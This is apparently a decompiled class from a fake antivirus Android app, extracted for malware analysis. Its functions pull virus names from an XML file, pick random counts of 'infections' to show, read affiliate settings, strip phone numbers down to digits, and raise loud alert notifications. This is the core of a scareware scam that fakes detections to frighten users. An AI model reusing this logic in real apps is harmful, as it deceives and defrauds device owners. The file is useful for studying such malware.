package com.worker.androiddefender2;

import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.media.RingtoneManager;
import android.support.v4.app.NotificationCompat;
import android.widget.RemoteViews;
import android.widget.Toast;
import com.example.androiddefender2.DefenderApplication;
import com.example.androiddefender2.MainActivity;
import java.util.ArrayList;
import java.util.Random;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import system.AppSingleton;
import system.VirusObject;
import system.XMLParser;

public class SystemFunctions {
  static final String KEY_COST = "type";
  
  static final String KEY_DESC = "description";
  
  static final String KEY_ID = "id";
  
  static final String KEY_ITEM = "item";
  
  static final String KEY_NAME = "name";
  
  private static int NOTIFICATION = 1234672;
  
  private static Random random = new Random();
  
  private NotificationManager mNM;
  
  public static void createVirusesList(Context paramContext) {
    XMLParser xMLParser = new XMLParser();
    NodeList nodeList = xMLParser.getDomElement(xMLParser.getXmlFromAssets(paramContext, "VirusesDescription.xml")).getElementsByTagName("item");
    for (byte b = 0; b < nodeList.getLength(); b++) {
      Element element = (Element)nodeList.item(b);
      AppSingleton appSingleton = AppSingleton.getInstance();
      VirusObject virusObject = new VirusObject();
      virusObject.setId(Integer.parseInt(xMLParser.getValue(element, "id")));
      virusObject.setName(xMLParser.getValue(element, "name"));
      virusObject.setType(xMLParser.getValue(element, "type"));
      virusObject.setDescription(xMLParser.getValue(element, "description"));
      appSingleton.theVirusList.add(virusObject);
    } 
  }
  
  public static int generateRandomCountVirus(int paramInt1, int paramInt2) {
    return (int)(Math.random() * (paramInt2 - paramInt1 + 1)) + paramInt1;
  }
  
  public static void generateToastException(String paramString) {
    Toast.makeText(DefenderApplication.getInstance().getApplicationContext(), paramString, 1).show();
  }
  
  public static ArrayList<Integer> generateVirusForIndex(int paramInt) {
    ArrayList<Integer> arrayList = new ArrayList();
    for (byte b = 0; b < paramInt; b++)
      arrayList.add(Integer.valueOf(getRandomVirus().getId())); 
    return arrayList;
  }
  
  public static void getDialog(String paramString1, String paramString2, Context paramContext) {
    AlertDialog.Builder builder = new AlertDialog.Builder(paramContext);
    builder.setTitle(paramString1);
    builder.setMessage(paramString2);
    builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
          public void onClick(DialogInterface param1DialogInterface, int param1Int) {}
        });
    builder.setCancelable(true);
    builder.create().show();
  }
  
  public static VirusObject getRandomVirus() {
    AppSingleton appSingleton = AppSingleton.getInstance();
    int i = appSingleton.theVirusList.size();
    i = Math.abs(random.nextInt(i));
    return appSingleton.theVirusList.get(i);
  }
  
  public static String getSettingOtstukTag(Context paramContext, String paramString) {
    XMLParser xMLParser = new XMLParser();
    Document document = xMLParser.getDomElement(xMLParser.getXmlFromAssets(paramContext, "AffiliateSettings.xml"));
    document.getElementsByTagName(paramString);
    return document.getElementsByTagName(paramString).item(0).getChildNodes().item(0).getNodeValue();
  }
  
  public static VirusObject getVirusByIndex(int paramInt) {
    return (AppSingleton.getInstance()).theVirusList.get(paramInt);
  }
  
  public static String prepareNumber(String paramString) {
    String str = paramString.replaceAll("[^0-9]+", "");
    paramString = str;
    if (str.length() == 11)
      paramString = str.substring(1); 
    return paramString;
  }
  
  public void generateNotification(Context paramContext, String paramString1, String paramString2) {
    String str = new String(paramString2);
    NotificationCompat.Builder builder = new NotificationCompat.Builder(paramContext);
    builder.setContentTitle(new String(paramString1));
    builder.setContentText(str);
    builder.setSmallIcon(2130837542);
    builder.setWhen(System.currentTimeMillis());
    builder.setAutoCancel(true);
    builder.setTicker(str);
    RingtoneManager.getDefaultUri(2);
    NotificationManager notificationManager = (NotificationManager)paramContext.getSystemService("notification");
    builder.setContentIntent(PendingIntent.getActivity(paramContext, 0, new Intent(paramContext, MainActivity.class), 0));
    Notification notification = builder.getNotification();
    notification.ledARGB = -16711936;
    notification.ledOnMS = 100;
    notification.ledOffMS = 100;
    notification.flags |= 0x1;
    notification.defaults |= 0x1;
    notification.defaults |= 0x4;
    notification.defaults |= 0x2;
    notificationManager.notify(NOTIFICATION, notification);
  }
  
  public Notification generateNotificationWithProgressBar(NotificationManager paramNotificationManager, Context paramContext) {
    PendingIntent pendingIntent = PendingIntent.getActivity(paramContext, 0, new Intent(paramContext, MainActivity.class), 0);
    Notification notification = new Notification(2130837542, "Downloading...", System.currentTimeMillis());
    notification.flags |= 0x2;
    notification.contentIntent = pendingIntent;
    notification.contentView = new RemoteViews(paramContext.getApplicationContext().getPackageName(), 2130903056);
    notification.contentView.setTextViewText(2131296361, "Downloading...");
    notification.contentView.setProgressBar(2131296362, 100, 0, false);
    paramNotificationManager.notify(42, notification);
    return notification;
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/SystemFunctions.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */